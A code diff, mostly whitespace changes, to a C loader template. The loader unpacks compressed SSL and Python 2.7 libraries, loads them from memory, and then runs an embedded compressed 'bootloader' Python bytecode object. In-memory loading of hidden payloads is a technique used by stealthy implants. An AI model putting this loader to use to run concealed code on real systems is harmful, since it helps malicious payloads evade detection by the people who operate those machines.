@@ -47,8 +47,8 @@ static inline void* xz_dynload(const char *soname, const char *xzbuf, size_t xzs
     uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);
 
     if (!uncompressed) {
-        dprint("%s decompression failed\n", soname);
-        abort();
+	dprint("%s decompression failed\n", soname);
+	abort();
     }
 
     void *res = memdlopen(soname, (char *) uncompressed, uncompressed_size);
@@ -56,8 +56,8 @@ static inline void* xz_dynload(const char *soname, const char *xzbuf, size_t xzs
     lzmafree(uncompressed, uncompressed_size);
 
     if (!res) {
-        dprint("loading %s from memory failed\n", soname);
-        abort();
+	dprint("loading %s from memory failed\n", soname);
+	abort();
     }
 
     return res;
@@ -74,8 +74,8 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
     if (getrlimit(RLIMIT_NOFILE, &lim) == 0) {
-        lim.rlim_cur = lim.rlim_max;
-        setrlimit(RLIMIT_NOFILE, &lim);
+	lim.rlim_cur = lim.rlim_max;
+	setrlimit(RLIMIT_NOFILE, &lim);
     }
 
     lim.rlim_cur = 0; lim.rlim_max = 0;
@@ -85,9 +85,9 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     xz_dynload("libssl.so.1.0.0", libssl_c_start, libssl_c_size);
 
     if(!Py_IsInitialized) {
-        _load_python(
-            xz_dynload("libpython2.7.so.1.0", python27_c_start, python27_c_size)
-        );
+	_load_python(
+	    xz_dynload("libpython2.7.so.1.0", python27_c_start, python27_c_size)
+	);
     }
 
     munmap((char *) libcrypto_c_start, libcrypto_c_size);
@@ -101,57 +101,58 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     char exe[PATH_MAX] = { '\0' };
 
     if(!Py_IsInitialized()) {
-        dprint("Py_IsInitialized\n");
+	dprint("Py_IsInitialized\n");
 
-        Py_FileSystemDefaultEncoding = "utf-8";
-        Py_IgnoreEnvironmentFlag = 1;
-        Py_NoSiteFlag = 1; /* remove site.py auto import */
-        Py_NoUserSiteDirectory = 1;
-        Py_OptimizeFlag = 2;
-        Py_DontWriteBytecodeFlag = 1;
+	Py_FileSystemDefaultEncoding = "utf-8";
+	Py_IgnoreEnvironmentFlag = 1;
+	Py_NoSiteFlag = 1; /* remove site.py auto import */
+	Py_NoUserSiteDirectory = 1;
+	Py_OptimizeFlag = 2;
+	Py_DontWriteBytecodeFlag = 1;
 
 #if defined(Linux)
-        dprint("INVOCATION NAME: %s\n", program_invocation_name);
+	dprint("INVOCATION NAME: %s\n", program_invocation_name);
 
-        if (readlink("/proc/self/exe", exe, sizeof(exe)) > 0) {
-            if (strstr(exe, "/memfd:")) {
-                snprintf(exe, sizeof(exe), "/proc/%d/exe", getpid());
-            }
-        } else {
-            char *upx_env = getenv("   ");
-            if (upx_env) {
-                snprintf(exe, sizeof(exe), "%s", upx_env);
-            }
-        }
+	if (readlink("/proc/self/exe", exe, sizeof(exe)) > 0) {
+	    if (strstr(exe, "/memfd:")) {
+		snprintf(exe, sizeof(exe), "/proc/%d/exe", getpid());
+	    }
+	} else {
+	    char *upx_env = getenv("   ");
+	    if (upx_env) {
+		snprintf(exe, sizeof(exe), "%s", upx_env);
+	    }
+	}
 
 #elif defined(SunOS)
-        strcpy(exe, getexecname());
+	strcpy(exe, getexecname());
 #endif
-        Py_SetProgramName(exe);
+	Py_SetProgramName(exe);
 
-        dprint("Initializing python.. (%p)\n", Py_Initialize);
-        Py_InitializeEx(0);
+	dprint("Initializing python.. (%p)\n", Py_Initialize);
+	Py_InitializeEx(so? 0 : 1);
 
-        dprint("SET ARGV\n");
-        if (argc > 0) {
-            if (so) {
-                if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
-                    argv[1] = argv[0];
-                    PySys_SetArgvEx(argc - 1, argv + 1, 0);
-                } else {
-                    PySys_SetArgvEx(1, argv, 0);
-                }
-            } else {
-                PySys_SetArgvEx(argc, argv, 0);
-            }
-        }
+	dprint("SET ARGV (ARGC=%d)\n", argc);
+	if (argc > 0) {
+	    if (so) {
+		if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
+		    argv[1] = argv[0];
+		    PySys_SetArgvEx(argc - 1, argv + 1, 0);
+		} else {
+		    PySys_SetArgvEx(1, argv, 0);
+		}
+	    } else {
+		PySys_SetArgvEx(argc, argv, 0);
+	    }
+	}
 
-        PySys_SetPath("");
+	PySys_SetPath("");
+
 #ifndef DEBUG
-        PySys_SetObject("frozen", PyBool_FromLong(1));
+	PySys_SetObject("frozen", PyBool_FromLong(1));
 #endif
-        PySys_SetObject("executable", PyString_FromString(exe));
-        dprint("Py_Initialize() complete\n");
+	PySys_SetObject("executable", PyString_FromString(exe));
+	dprint("Py_Initialize() complete\n");
     }
     restore_state=PyGILState_Ensure();
 
@@ -165,20 +166,20 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
     m = PyImport_AddModule("__main__");
     if (m) d = PyModule_GetDict(m);
     if (d) seq = PyObject_lzmaunpack(
-        bootloader_c_start,
-        bootloader_c_size
+	bootloader_c_start,
+	bootloader_c_size
     );
 
     munmap((char *) bootloader_c_start, bootloader_c_size);
 
     if (seq) {
-        PyObject *discard = PyEval_EvalCode((PyCodeObject *)seq, d, d);
-        dprint("EVAL CODE %p -> %p\n", seq, discard);
-        if (!discard) {
-            PyErr_Print();
-            rc = 255;
-        }
-        Py_XDECREF(discard);
+	PyObject *discard = PyEval_EvalCode((PyCodeObject *)seq, d, d);
+	dprint("EVAL CODE %p -> %p\n", seq, discard);
+	if (!discard) {
+	    PyErr_Print();
+	    rc = 255;
+	}
+	Py_XDECREF(discard);
     }
     Py_XDECREF(seq);
 
